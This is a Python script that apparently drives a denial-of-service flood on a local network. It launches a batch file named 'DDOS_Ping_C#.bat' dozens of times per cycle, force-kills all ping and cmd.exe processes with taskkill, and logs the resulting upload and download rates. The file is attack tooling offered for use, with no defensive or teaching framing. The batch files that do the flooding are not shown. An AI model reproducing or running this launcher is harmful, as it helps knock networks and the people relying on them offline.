import time
import subprocess
import psutil
import os

#ACCESS PATHS#
lan_ddos_batch = 'DDOS_Ping_C#.bat'
lan_ddos_batch1 = 'LAN_DDOS_BATCH.bat'

UPDATE_DELAY = 0.1 # in seconds
iteration = 0
def get_size(bytes):
    """
    Returns size of bytes in a nice format
    """
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if bytes < 1024:
            return f"{bytes:.2f}{unit}B"
        bytes /= 1024
io = psutil.net_io_counters()
bytes_sent, bytes_recv = io.bytes_sent, io.bytes_recv
def Init_DDOS_1():
    #2.2MB PACKAGE
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)

    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
    process = subprocess.Popen(lan_ddos_batch)
while True:
    add_iteration = iteration+1
    iteration = add_iteration
    if iteration < 20:
        Init_DDOS_1()
        Init_DDOS_1()
        process = subprocess.run('taskkill /im Ping_C#.exe /im PING.exe /im cmd.exe /F /T')
        io_2 = psutil.net_io_counters()
        us, ds = io_2.bytes_sent - bytes_sent, io_2.bytes_recv - bytes_recv
        with open('NETWORK_LOG.txt', 'w') as write_file:
                write_file.write(f"Upload: {get_size(io_2.bytes_sent)}   "
                                    f", Download: {get_size(io_2.bytes_recv)}   "
                                    f", Upload Speed: {get_size(us / UPDATE_DELAY)}/s   "
                                    f", Download Speed: {get_size(ds / UPDATE_DELAY)}/s      ")
        print(f"Upload: {get_size(io_2.bytes_sent)}   "
                f", Download: {get_size(io_2.bytes_recv)}   "
                f", Upload Speed: {get_size(us / UPDATE_DELAY)}/s   "
                f", Download Speed: {get_size(ds / UPDATE_DELAY)}/s      ", end="\r")
        bytes_sent, bytes_recv = io_2.bytes_sent, io_2.bytes_recv
    elif iteration > 20:
        process = subprocess.run('taskkill /im Ping_C#.exe /im PING.exe /im cmd.exe /F /T')
        process = subprocess.run('taskkill /im Ping_C#.exe /im PING.exe /im cmd.exe /F /T')
        process = subprocess.run('taskkill /im Ping_C#.exe /im PING.exe /im cmd.exe /F /T')
        time.sleep(10)
        iteration = 0